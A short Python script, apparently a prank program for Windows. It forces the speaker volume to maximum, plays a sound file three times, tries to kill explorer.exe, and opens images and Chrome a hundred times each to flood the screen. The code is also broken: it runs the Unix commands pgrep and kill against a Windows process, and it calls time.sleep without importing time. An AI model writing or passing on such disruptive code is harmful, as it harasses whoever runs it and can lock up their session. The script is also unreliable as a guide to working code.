from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import subprocess
import threading
from time import sleep
from playsound import playsound
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))

volume.SetMasterVolumeLevel(0.0, None)
def playsoundy():
	for i in range(3):
		playsound('SkibidiToiletRizz.wav')

	process_name = 'explorer.exe'
	pid_cmd = f"pgrep {process_name}"
	pid_process = subprocess.Popen(pid_cmd, stdout=subprocess.PIPE, shell=True)
	pid = pid_process.stdout.read().decode().strip()
	subprocess.run(['kill', pid])

def startprograms():
    time.sleep(1)
    for i in range(100):
        subprocess.Popen(['start', 'max.png'], shell=True)
        volume.SetMasterVolumeLevel(0.0, None)
        subprocess.Popen(['start', 'GoogleChrome.exe'], shell=True)
        subprocess.Popen(['start', 'OIP.jpg'], shell=True)

threads = []
thread = threading.Thread(target=playsoundy)
thread1 = threading.Thread(target=startprograms)
threads.append(thread1)
threads.append(thread)
for i in threads:
	i.start()